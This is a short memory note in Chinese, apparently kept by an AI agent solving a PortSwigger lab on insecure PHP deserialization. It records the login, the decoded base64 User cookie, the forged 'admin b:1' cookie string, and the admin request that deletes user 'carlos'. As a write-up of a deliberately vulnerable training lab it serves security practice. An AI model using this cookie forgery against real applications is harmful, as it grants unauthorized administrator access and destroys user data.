---
metadata:
  node_type: memory
name: "PRS arm A lab-deserialization-modifying-serialized-objects"
description: "arm A 基线:lab-deserialization-modifying-serialized-objects 冷实例(reused:false)一次通过 - base64 PHP User 对象 admin b:0→b:1 改包即越权删 carlos"
last_updated: 2026-10-09T09:42:00+08:00
created: 2026-10-09T09:42:00+08:00
---

## 2026-10-09 arm A 基线

题:lab-deserialization-modifying-serialized-objects(canonical 路径实填)。
实例 https://0ab3002003b3a2d080fb2b4600ec0095.web-security-academy.net/,reused:false。

### 链路(一步不缺)
1. page_read 未用;range_launch launch-url 直吃 canonical 路径 → instance_url(取号内含)。
2. GET / → 200,会话 cookie 被清空(session=)。
3. GET /login → 登录表单 POST /login,username/password,无 csrf。
4. POST /login(username=wiener,password=peter)→ 302 /my-account?id=wiener,
   Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
5. base64 解出:O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
   改 admin → b:1(长度不变,序列化自洽):O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
6. b64 encode → Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
7. GET /admin + Cookie 该串 → 200 管理面板(wiener/carlos Delete 链接)。
8. GET /admin/delete?username=carlos --follow → 302 /admin → 200,
   "User deleted successfully!",carlos 消失,banner is-solved + congrats。

### 要点
- 会话是 PHP 序列化对象 base64 塞 cookie,服务端反序列化后信任其 admin 字段;
  改字段值不牵动字符串长度,无需重算 s: 前长度(与那些改 username 长度的题不同)。
- banner_verdict 复核 solved:true(solved_class true,congrats 行命中)。
- 坑:http_session --jar 会带 jar 内 session(admin=false),与 --header Cookie 并存时
  hop.sent_cookie 只反映 jar 值;要干净证明用新空 jar(/tmp/cj2.json)让改包 cookie 独占。
- launch-url 直接起实例,不必 page_read 取号;fresh 实例无需 banner 弃跃迁。

